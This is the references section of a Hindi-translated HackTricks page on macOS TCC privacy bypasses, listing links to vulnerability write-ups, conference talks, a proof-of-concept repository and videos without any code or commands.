- [11] [नई macOS vulnerability, "powerdir," से unauthorized user data access हो सकता है](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home directory बदलना और TCC bypass करना, यानी CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Music play करना और TCC bypass करना, यानी CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [एक (Fire)fox को कैसे लूटें](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS में Telegram के साथ TCC bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple Vulnerabilities का खुलासा: diskarbitrationd और storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X पर environment variables set करना](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass और privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC database के ऊपर mount करके TCC bypass](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [आपके macOS Privacy Mechanisms को bypass करने के 20+ तरीके](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC के विरुद्ध Knockout Win - आपके MacOS Privacy Mechanisms को bypass करने के 20+ नए तरीके](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
